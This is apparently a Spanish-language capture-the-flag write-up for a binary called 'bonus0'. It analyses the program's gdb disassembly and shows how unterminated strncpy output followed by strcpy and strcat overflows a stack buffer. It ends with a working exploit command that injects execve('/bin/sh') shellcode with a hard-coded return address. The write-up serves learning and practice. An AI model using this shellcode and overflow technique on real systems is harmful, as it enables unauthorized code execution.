1.- Analizamos con gdb y encontramos dos funciones a parte de main() que son pp() y p()

  main() -> pp(char *dest) -> p(char *dest, char *s)
                  |
                  ----------> p(char *dest, char *s)

  main()
  [...]
  0x080485ad <+9>:	   lea    eax,[esp+0x16]        
  0x080485b1 <+13>:    mov    DWORD PTR [esp],eax     ;carga un puntero en esp
  0x080485b4 <+16>:    call   0x804851e <pp>          ;llama a pp() con el parámetro del puntero
  [...]
  0x080485b9 <+21>:	lea    eax,[esp+0x16]
  0x080485bd <+25>:	mov    DWORD PTR [esp],eax
  0x080485c0 <+28>:	call   0x80483b0 <puts@plt>       ;hace un puts con el puntero que le ha pasado a pp
  [...]

2.- A la función pp() main() le pasa como argumento un char* de 42 bytes
  
  main()
  [...]
  0x080485aa <+6>:     sub    esp,0x40
  0x080485ad <+9>:     lea    eax,[esp+0x16]
  0x080485b1 <+13>:    mov    DWORD PTR [esp],eax
  0x080485b4 <+16>:    call   0x804851e <pp>
  [...]

  Reserva en el stack 0x40 bytes y le pasa a la función pp() esp+0x16 (0x40 - 0x16 = 0x2a) 42 decimal


3.- Examinando la funcion pp() vemos que llama dos veces a la función p() y le pasa como argumento un char* de 20 bytes
  
  pp()
  [...]
  0x0804852e <+16>:    lea    eax,[ebp-0x30]
  0x08048531 <+19>:    mov    DWORD PTR [esp],eax
  0x08048534 <+22>:    call   0x80484b4 <p>                   ;llamada a p(*str1)
  0x08048539 <+27>:    mov    DWORD PTR [esp+0x4],0x80486a0   ;es la string " - "
  0x08048541 <+35>:    lea    eax,[ebp-0x1c]
  0x08048544 <+38>:    mov    DWORD PTR [esp],eax
  0x08048547 <+41>:    call   0x80484b4 <p>                   ;llamada a p(*str2)
  [...]

4.- Lo primero que hace p() es imprimir el 2º parametro que le manda pp() y es una cadean " - "
  [...]
  0x080484bd <+9>:	mov    eax,DWORD PTR [ebp+0xc] ;la cadena del 2º argumento " - "
  0x080484c0 <+12>:	mov    DWORD PTR [esp],eax
  0x080484c3 <+15>:	call   0x80483b0 <puts@plt>
  [...]

5.- En la función p() encontramos que hace un read de stdin sobre un buffer de 4096 bytes 

  p()
  [...]
  0x080484c8 <+20>:	mov    DWORD PTR [esp+0x8],0x1000   ;4096
  0x080484d0 <+28>:	lea    eax,[ebp-0x1008]             ;buff 
  0x080484d6 <+34>:	mov    DWORD PTR [esp+0x4],eax      
  0x080484da <+38>:	mov    DWORD PTR [esp],0x0          ;stdin
  0x080484e1 <+45>:	call   0x8048380 <read@plt>
  [...]

6.- Luego hace un strchr para buscar el caracter '\n' sobre la cadena que ha obtenido del read para luego sustituirlo por un NUL '\0'
  
  p()
  [...]
  0x080484e6 <+50>:	mov    DWORD PTR [esp+0x4],0xa      ;'\n'
  0x080484ee <+58>:	lea    eax,[ebp-0x1008]             ;el buff
  0x080484f4 <+64>:	mov    DWORD PTR [esp],eax
  0x080484f7 <+67>:	call   0x80483d0 <strchr@plt>
  0x080484fc <+72>:	mov    BYTE PTR [eax],0x0           ;sustitulle el caracter '\n' por '\0' (NULL)
  [...]

7.- Por último hace un strncpy para copiar la cadena que tiene el el los 20 primeros bytes del buffer a *str que le pasamos como parámetro a la función p()

  p()
  [...]
  0x080484ff <+75>:	lea    eax,[ebp-0x1008]             ;el buff
  0x08048505 <+81>:	mov    DWORD PTR [esp+0x8],0x14     ;20 carácteres
  0x0804850d <+89>:	mov    DWORD PTR [esp+0x4],eax
  0x08048511 <+93>:	mov    eax,DWORD PTR [ebp+0x8]      ;le str del parametro de p(str)
  0x08048514 <+96>:	mov    DWORD PTR [esp],eax
  0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>
  [...]

8.- Volvemos a la función pp(). Copia por medio de strcpy() el primer puntero obtenido por p() a buff que se le pasa como parámetro a pp()
  
  pp()
  [...]
  0x0804854c <+46>:	lea    eax,[ebp-0x30]             ;str de la primera llamanda a p(str1, " - ")
  0x0804854f <+49>:	mov    DWORD PTR [esp+0x4],eax
  0x08048553 <+53>:	mov    eax,DWORD PTR [ebp+0x8]    ;la str de la llamada de pp(buff)
  0x08048556 <+56>:	mov    DWORD PTR [esp],eax
  0x08048559 <+59>:	call   0x80483a0 <strcpy@plt>     ;strcpy(buff, str1)
  [...]

9.- Luego continua haciendo alguna operación
  [...]
  0x0804855e <+64>:	mov    ebx,0x80486a4                      ;0x80486a4 = " "
  0x08048563 <+69>:	mov    eax,DWORD PTR [ebp+0x8]            ;eax = buff
  0x08048566 <+72>:	mov    DWORD PTR [ebp-0x3c],0xffffffff    ;ebp-0x3c = -1 se usa para el contador de repnz <+91>
  0x0804856d <+79>:	mov    edx,eax                            ;edx = buff
  0x0804856f <+81>:	mov    eax,0x0
  0x08048574 <+86>:	mov    ecx,DWORD PTR [ebp-0x3c]           ;ecx = -1
  0x08048577 <+89>:	mov    edi,edx 
  0x08048579 <+91>:	repnz scas al,BYTE PTR es:[edi]           ;esto es un strlen(buff) 
  0x0804857b <+93>:	mov    eax,ecx                            ;ecx = -(strlen(buff) + 1)
  0x0804857d <+95>:	not    eax                                ;invierte eax que ahora es strlen(buff)
  0x0804857f <+97>:	sub    eax,0x1                            ;le resta 1
  0x08048582 <+100>:	add    eax,DWORD PTR [ebp+0x8]          ;ahora eax apunta a la última posicion de buff
  0x08048585 <+103>:	movzx  edx,WORD PTR [ebx]               ;edx = " "
  0x08048588 <+106>:	mov    WORD PTR [eax],dx                ;se escribe en el final del buffer " "
  [...]

10.- Prepara la llamada a strcat(buff, str2)
  [...]
  0x0804858b <+109>:	lea    eax,[ebp-0x1c]               ;donde está almacenada str2
  0x0804858e <+112>:	mov    DWORD PTR [esp+0x4],eax      
  0x08048592 <+116>:	mov    eax,DWORD PTR [ebp+0x8]      ;buff
  0x08048595 <+119>:	mov    DWORD PTR [esp],eax
  0x08048598 <+122>:	call   0x8048390 <strcat@plt>
  [...]
  

ltrace -> ver direccion donde devuelve la funcion strcpy() en pp()
(python2 -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd"'; python2 -c 'print "\x80" + "A"*13 + "\x46\xfc\xff\xbf" + "A"'; cat -) | ./bonus0


